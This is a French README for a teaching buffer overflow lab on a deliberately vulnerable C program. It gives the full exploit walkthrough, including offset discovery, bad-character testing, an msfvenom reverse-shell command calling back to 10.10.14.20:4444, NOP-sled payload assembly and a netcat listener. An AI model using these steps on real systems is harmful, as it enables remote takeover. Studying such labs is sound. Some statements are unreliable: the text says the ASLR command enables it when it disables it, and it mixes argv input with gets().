# 🔥 Buffer Overflow Lab — Démonstration pédagogique (C / x86)

Ce dépôt présente **une vulnérabilité de type Buffer Overflow** sur un petit programme C volontairement vulnérable.  
L’objectif est **d’expliquer clairement** la vulnérabilité, **montrer ma démarche d’analyse**, et **mettre en avant mes compétences en sécurité applicative / exploitation**.

---

📄 Disclaimer

Ce code est destiné uniquement à la formation, dans un environnement contrôlé.
Il n’est pas destiné à être utilisé en conditions réelles.

## 🎯 Objectifs pédagogiques

- Comprendre un débordement de tampon sur la pile (stack-based buffer overflow).
- Voir comment une donnée contrôlée par l’utilisateur (ici `argv[1]`) peut écraser la mémoire adjacente.
- Observer le comportement via `gdb` / `pwndbg`.
- Montrer une démarche rigoureuse que j’applique aux audits et challenges CTF.

---

## 🧠 Mon raisonnement

### 1. Choisir un pattern vulnérable
Pour démontrer un buffer overflow, j’ai délibérément utilisé :

- un **buffer trop petit** ;
- une **fonction dangereuse** (`gets()`), qui ne vérifie pas la taille ;
- une **variable critique à proximité sur la stack**.

Cela simule parfaitement les erreurs courantes en C, encore présentes dans d’anciens systèmes ou du code legacy.

### 2. Rendre la vulnérabilité exploitable
Le programme récupère l’input utilisateur via :

./vuln "$(python3 -c 'print("A"*100)')"


ou une chaîne directement fournie par l’attaquant.

Cette chaîne est **copiée sans contrôle** dans un buffer de 32 octets → overflow garanti.

### 3. Observer l’impact avec gdb
Une fois compilé sans protections :

make
gdb ./vuln
run $(python3 -c 'print("A"*80)')

On visualise alors :

- l’écrasement de l’EIP/RIP (selon architecture),
- la disposition de la stack,
- les registres modifiés.


### 🔥 Exploitation pas-à-pas : Overflow → NOP Sled → Shellcode → Jump vers EIP

#### 🧩 Étape 1 — Trouver la distance entre le buffer et l’EIP (à tâtons)

Avant de créer un exploit fiable, on doit déterminer combien d’octets sont nécessaires pour écraser l’EIP.

Méthode empirique :

On injecte progressivement un nombre croissant de caractères :

./vuln $(python3 -c 'print("A"*20)')
./vuln $(python3 -c 'print("A"*40)')
./vuln $(python3 -c 'print("A"*60)')


On voit à partir de quelle taille le programme crash (Segfault).

Une fois la zone atteinte, on ajuste à ±2 octets jusqu’à ce que les 4 octets suivants contrôlent l’EIP :

./vuln $(python3 -c 'print("A"*52 + "BBBB")')


Dans gdb :

EIP = 0x42424242   ('BBBB')


👉 C’est notre offset EIP.

Supposons pour l’exemple :

OFFSET = 52


(Le vrai nombre dépend du programme.)

#### 🧬 Étape 2 — Déterminer les “bad chars”

Un shellcode ne doit pas contenir de caractères problématiques comme :
00 0a 0d 20 ff etc.

On envoie une suite de bytes de \x00 à \xff et on observe où la chaîne est tronquée dans la mémoire.

Payload généré :

python3 - <<EOF
badchars = b"".join(bytes([i]) for i in range(1,256))
print(b"A"*52 + badchars)
EOF


Dans gdb :

x/200bx $esp


On repère quels octets ne passent pas.
Ceux-ci seront exclus dans msfvenom :

Exemple :

Bad chars : \x00 \x0a \x0d

##### 🧨 Étape 3 — Générer le shellcode msfvenom sans les bad chars

Exemple reverse shell shellcode (Linux/x86) :

msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 \
  -f python -b "\x00\x0a\x0d"


On récupère :

buf =  b""
buf += b"\xda\xc0\xd9\x74\x24\xf4...etc"


On note la longueur du shellcode :

len(shellcode) = SHELLCODE_SIZE

#### 🧪 Étape 4 — Calcul du nombre de 0x55

Notre payload final doit remplir exactement OFFSET octets avant l’EIP.

Structure :

[55 55 55 ...]  filler
[90 90 ...]     NOP sled (100 bytes)
[shellcode]     payload d'attaque
[ADDR]          adresse de saut (EIP → NOP sled)


On veut que :

len(filler) + 100 + SHELLCODE_SIZE + 4 = OFFSET


Donc nombre de filler (0x55) :

FILLER = OFFSET - 100 - SHELLCODE_SIZE - 4


Exemple si OFFSET=52, shellcode=25 bytes :

FILLER = 52 - 100 - 25 - 4 = impossible


=> dans ce cas on met le NOP sled AVANT le shellcode, PAS forcément 100 bytes :
on ajuste pour que tout tienne avant l’EIP.

Exemple plus classique :

OFFSET = 112
SHELLCODE_SIZE = 32
FILLER = 112 - 100 - 32 - 4 = -24  (on réduit un peu le NOP sled)


L’idée est d’ adapter dynamiquement pour avoir :

payload_before_eip = OFFSET

#### 🧭 Étape 5 — Trouver l’adresse de saut dans gdb

On met un breakpoint au début de vulnerable_function :

gdb ./vuln
(gdb) break vulnerable_function
(gdb) run $(python3 -c 'print("A"*OFFSET)')


Juste avant l’overflow, on inspecte la pile pour trouver une adresse poinçant dans notre NOP sled :

(gdb) x/50x $esp


On repère une adresse dans notre buffer, par exemple :

0xffffd3b0


-> On convertit cette adresse en little-endian pour l’EIP :

\xb0\xd3\xff\xff

#### 🎯 Étape 6 — Construire le payload final

Exemple Python :

filler   = b"\x55" * FILLER
nops     = b"\x90" * 100
payload  = shellcode
retaddr  = b"\xb0\xd3\xff\xff"   # adresse dans le NOP sled

exploit  = filler + nops + payload + retaddr
print(exploit)


Exécution :

./vuln $(python3 exploit.py)


En parallèle :

nc -lvnp 4444


→ Reverse shell obtenu (si ASLR désactivé / NX off).

### 4. Conclusion
L’exploitation d’un buffer overflow n’est pas seulement un exercice offensif.  
Elle permet de comprendre **pourquoi les protections modernes existent** (ASLR, NX, Stack Canary, RELRO…).

### 5. Compilation
Sans les protections de sécurité (mode démonstration)
gcc vulnerable.c -o vuln -fno-stack-protector -z execstack


Vous pouvez activer l’ASLR systématiquement pour vos tests :

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

---